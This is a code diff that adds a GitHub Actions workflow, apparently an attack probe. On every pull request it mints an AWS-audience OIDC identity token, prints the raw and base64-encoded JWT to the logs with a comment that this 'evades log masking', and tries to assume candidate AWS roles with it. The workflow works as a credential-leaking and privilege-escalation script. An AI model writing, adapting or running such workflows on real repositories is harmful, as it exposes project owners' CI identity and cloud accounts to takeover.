@@ -1,0 +1,60 @@
+name: tdx62 OIDC probe
+
+on:
+  pull_request:
+    branches: [master]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Context
+        run: |
+          echo "repo=$GITHUB_REPOSITORY"
+          echo "event=$GITHUB_EVENT_NAME"
+          echo "ref=$GITHUB_REF"
+          echo "sha=$GITHUB_SHA"
+          echo "actor=$GITHUB_ACTOR"
+          echo "head_ref=$GITHUB_HEAD_REF"
+          echo "base_ref=$GITHUB_BASE_REF"
+          echo "token_url_set=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "--- event payload (head) ---"
+          head -c 3000 "$GITHUB_EVENT_PATH" || true
+
+      - name: Mint OIDC token
+        run: |
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          TOKEN=$(echo "$RESP" | jq -r .value)
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "--- jwt payload ---"
+          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null || true
+          echo ""
+          echo "--- raw jwt ---"
+          echo "$TOKEN"
+          echo "--- end raw jwt ---"
+          echo "$TOKEN" > /tmp/oidc.jwt
+          echo "--- base64 jwt (evades log masking) ---"
+          base64 -w0 /tmp/oidc.jwt
+          echo ""
+          echo "--- end base64 jwt ---"
+
+      - name: STS role probes
+        if: always()
+        run: |
+          set +e
+          ROLES="${{ vars.TDX62_PROBE_ROLES }}"
+          echo "probing roles: [$ROLES]"
+          if [ -z "$ROLES" ]; then echo "no candidate roles configured"; exit 0; fi
+          for R in $ROLES; do
+            echo "=== $R ==="
+            aws sts assume-role-with-web-identity \
+              --role-arn "$R" \
+              --role-session-name tdx62 \
+              --web-identity-token "$(cat /tmp/oidc.jwt)" \
+              --duration-seconds 900 2>&1 | head -20
+          done
